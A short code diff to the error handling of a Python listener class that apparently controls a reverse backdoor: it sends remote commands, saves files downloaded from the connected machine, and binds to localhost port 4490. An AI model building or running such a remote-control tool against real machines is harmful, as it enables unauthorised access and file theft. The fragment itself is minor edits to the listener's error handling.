@@ -72,18 +72,15 @@ class Listener:
 
                 result = self.execute_remote_command(command)
 
-                if command[0] == "download":
+                if command[0] == "download" and "[-] Error " not in result:
                     result = self.write_file(command[1], result)
 
-                print(result)
+            except Exception:
+                print("[-] Error during command execution")
+            
+            print(result)
 
-            except json.JSONDecodeError:
-                pass
 
-            except KeyboardInterrupt:
-                print("[+] Detected CTRL + C.....Closing App....Please wait...")
-                self.connection.close()
-                exit()
 
 # class end
 my_listener = Listener("127.0.0.1", 4490)
